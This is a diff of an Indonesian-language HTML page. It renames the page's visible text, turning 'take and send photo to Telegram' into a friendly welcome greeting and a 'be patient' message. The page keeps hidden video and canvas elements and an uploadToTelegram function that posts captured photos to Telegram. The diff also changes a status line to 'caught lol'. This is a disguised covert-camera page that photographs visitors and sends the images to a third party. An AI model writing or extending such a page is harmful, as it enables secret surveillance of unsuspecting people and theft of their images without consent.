@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ambil dan Kirim Foto Otomatis</title>
+  <title>SELAMAT DATANG TEMAN</title>
   <style>
     body { text-align: center; font-family: Arial, sans-serif; margin-top: 20px; }
     #status { font-size: 18px; color: #333; }
   </style>
 </head>
 <body>
-  <h2>Ambil dan Kirim Foto ke Telegram</h2>
-  <p id="status">Memuat kamera...</p>
+  <h2>Selamat datang temann:)</h2>
+  <p id="status">Sabar yaa...</p>
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -51,7 +51,7 @@
 
     // Kirim ke Telegram
     async function uploadToTelegram(photoData) {
-      status.textContent = 'Mengirim foto ke Telegram...';
+      status.textContent = 'Tertangkap wkwk...';
       try {
         const blob = await (await fetch(photoData)).blob();
         const formData = new FormData();
